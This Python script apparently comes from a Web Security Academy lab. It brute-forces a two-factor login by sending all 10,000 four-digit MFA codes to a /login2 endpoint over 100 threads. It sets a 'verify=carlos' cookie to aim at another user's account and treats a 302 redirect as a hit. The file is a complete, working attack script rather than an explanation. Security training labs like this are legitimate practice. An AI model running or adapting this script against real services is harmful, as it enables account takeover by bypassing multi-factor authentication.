from __future__ import annotations

import os
import re
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# --- CONFIGURACIÓN ---
MAX_THREADS = 100
RESULT_FOLDER = "results"

burp0_url = "https://0a01009a03a613c582f62e1c004d00f6.web-security-academy.net:443/login2"
burp0_cookies = {"verify": "carlos", "session": "iTkCJ0UZDDS3vAoTjXrUmVYEX9ImmHd7"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", "Origin": "https://0a01009a03a613c582f62e1c004d00f6.web-security-academy.net", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a01009a03a613c582f62e1c004d00f6.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i", "Connection": "keep-alive"}

print_lock = Lock()

def check_code(code: str) -> bool:
    try:
        data = {"mfa-code": code}
        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data, timeout=15)
        return res.status_code == 302
    except requests.RequestException as e:
        return False


def check_codes():
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futuras = {
            executor.submit(check_code, code): code
            for code in get_codes()
        }

        for fut in as_completed(futuras):
            code = futuras[fut]

            try:
                found = fut.result()

                with print_lock:
                    print(f"[{code}] -> {found}", flush=True)

            except Exception as e:
                with print_lock:
                    print(f"[{code}] -> ERROR: {e}", flush=True)

def get_codes():
    for i in range(10000):
        yield f"{i:04d}"

def main():
    os.makedirs(RESULT_FOLDER, exist_ok=True)
    check_codes()

if __name__ == "__main__":
    main()
